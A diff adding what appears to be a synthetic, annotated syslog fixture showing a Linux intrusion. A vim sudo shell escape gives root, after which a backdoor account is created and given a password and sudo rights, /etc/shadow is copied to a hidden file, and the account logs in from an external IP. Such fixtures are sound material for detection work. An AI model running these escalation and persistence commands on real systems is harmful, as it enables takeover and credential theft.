@@ -1,0 +1,10 @@
+{"timestamp":"2026-06-25T11:30:01Z","level":"info","host":"LINUX-DEV-03","source":"syslog","message":"sshd: Accepted password for devuser from 10.0.5.88 port 51234 ssh2"}
+{"timestamp":"2026-06-25T11:31:14Z","level":"info","host":"LINUX-DEV-03","source":"syslog","message":"sudo: devuser : TTY=pts/1 ; PWD=/home/devuser ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts"}
+{"timestamp":"2026-06-25T11:31:22Z","level":"warn","host":"LINUX-DEV-03","source":"syslog","message":"sudo: devuser ran command as root: /usr/bin/vim — vim is in sudoers with NOPASSWD (misconfiguration)"}
+{"timestamp":"2026-06-25T11:33:07Z","level":"critical","host":"LINUX-DEV-03","source":"syslog","message":"process: bash spawned with UID=0 (root) by devuser via vim :!shell escape. GTFOBins technique: vim !/bin/bash"}
+{"timestamp":"2026-06-25T11:33:12Z","level":"critical","host":"LINUX-DEV-03","source":"syslog","message":"root: useradd -m -s /bin/bash backdoor-user — new local user created by root shell (devuser session)"}
+{"timestamp":"2026-06-25T11:33:18Z","level":"critical","host":"LINUX-DEV-03","source":"syslog","message":"root: echo 'backdoor-user:P@ss1234' | chpasswd — password set for backdoor-user"}
+{"timestamp":"2026-06-25T11:33:25Z","level":"critical","host":"LINUX-DEV-03","source":"syslog","message":"root: usermod -aG sudo backdoor-user — backdoor-user added to sudo group (full root access)"}
+{"timestamp":"2026-06-25T11:33:31Z","level":"warn","host":"LINUX-DEV-03","source":"syslog","message":"root: cat /etc/shadow > /tmp/.shadow_backup — sensitive file exfiltration via root shell"}
+{"timestamp":"2026-06-25T11:34:02Z","level":"warn","host":"LINUX-DEV-03","source":"syslog","message":"sshd: Accepted password for backdoor-user from 185.233.102.47 — EXTERNAL IP login as new backdoor account"}
+{"timestamp":"2026-06-25T11:34:09Z","level":"critical","host":"LINUX-DEV-03","source":"syslog","message":"backdoor-user: sudo su - : full root shell obtained via backdoor account from external IP 185.233.102.47"}
